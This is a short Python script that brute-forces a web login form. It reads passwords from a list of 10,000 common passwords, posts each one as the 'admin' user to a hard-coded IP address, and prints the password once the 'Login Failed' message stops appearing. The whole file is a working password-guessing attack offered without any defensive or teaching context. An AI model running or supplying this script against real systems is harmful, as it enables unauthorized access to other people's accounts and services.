import requests

target_url = "http://192.68.48.138"
data_dic = {"username":"admin","password":""}

with open("Password_10k_common.txt", 'r') as word_list:
    for line in word_list:
        word = line.strip()
        data_dic["password"] = word
        response = requests.post(target_url, data=data_dic)
        if "Login Failed" not in response.content:
            print("[+] We Got password --> " + word)
            exit()

print("Reach at the end of code.....")